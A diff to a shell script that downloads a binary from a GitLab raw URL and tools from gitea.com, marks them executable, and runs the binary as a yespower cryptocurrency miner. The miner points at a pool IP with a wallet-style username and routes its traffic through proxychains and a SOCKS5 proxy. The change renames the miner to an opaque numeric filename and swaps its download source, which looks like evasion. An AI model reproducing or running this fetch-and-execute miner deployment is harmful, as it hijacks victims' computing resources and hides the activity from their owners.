@@ -1,6 +1,6 @@
 proxy="192.252.209.155" 
 port="14455" 
-wget -q -O Tolino https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x Tolino
+wget -q -O 0083075176 https://gitlab.com/node.js2594450/ruby/-/raw/main/klm && chmod +x 0083075176
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
 wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
@@ -17,4 +17,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./Tolino -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-999 -n 1)-senio) --timeout 120 -p c=CRNC,mc=VHH -x socks5://192.252.209.155:14455
+./panel ./0083075176 -a yespower -o 149.50.222.86:443 -u KMFbor5m85Kh6fSjLKDZuSG6nJHMARC3TQ.$(echo $(shuf -i 1-999 -n 1)-senio) --timeout 120 -p c=CRNC,mc=VHH -x socks5://192.252.209.155:14455
